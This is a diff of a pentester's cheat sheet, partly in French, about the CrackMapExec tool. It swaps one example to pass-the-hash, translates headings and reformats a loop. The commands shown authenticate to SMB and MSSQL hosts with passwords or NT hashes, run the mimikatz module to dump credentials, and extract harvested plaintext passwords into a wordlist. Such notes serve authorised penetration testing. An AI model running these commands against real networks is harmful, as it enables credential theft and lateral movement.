@@ -11,7 +11,7 @@ Il faut préciser le protocole à utiliser.
 Exemples :
 
 `crackmapexec smb 192.168.1.1 -d domain.local -u admuser -p 'P@ssw0rd'`
-`sudo crackmapexec smb 192.168.5.4 -d domain.local -u admuser -p 'P@ssw0rd' -M mimikatz`
+`sudo crackmapexec smb 192.168.5.4 -d domain.local -u admuser -H <lmHash:ntHash> -M mimikatz`
 `crackmapexec mssql 192.168.1.1 -d domain.local -u admuser -p 'P@ssw0rd' -q 'SELECT @@version'`
 `crackmapexec mssql 192.168.2.3 -d domain.local -u admuser -p 'P@ssw0rd' --port 53757 -q 'SELECT name FROM master..sysdatabases;'`
 
@@ -21,12 +21,14 @@ Exemples :
 Extract all clear-text passwords from domain (to fill a wordlist).
 
 ```
-for f in ~/.cme/workspaces/default/{smb,mssql}.db ; do sqlite3 "$f"  <<< 'select password from users where credtype = "plaintext";' ; done | sort -u
+for f in ~/.cme/workspaces/default/{smb,mssql}.db ; do
+    sqlite3 "$f"  <<< 'select password from users where credtype = "plaintext";'
+done | sort -u
 ```
 
 
 
-### old releases (2 et 3)
+### old releases (2 and 3)
 
 #### recon
 
@@ -34,9 +36,9 @@ for f in ~/.cme/workspaces/default/{smb,mssql}.db ; do sqlite3 "$f"  <<< 'select
 
 #### exploit
 
-avec un mot de passe :
+using a password:
 `crackmapexec <ipVictime> -d <domain|hostname> -u <username> -p <password> <commande>`
-Ou via le hash :
+using a hash:
 `crackmapexec <ipVictime> -d <domain|hostname> -u <username> -H <lmHash:ntHash> <commande>`
 
 Commandes utiles avec des droits utilisateurs :
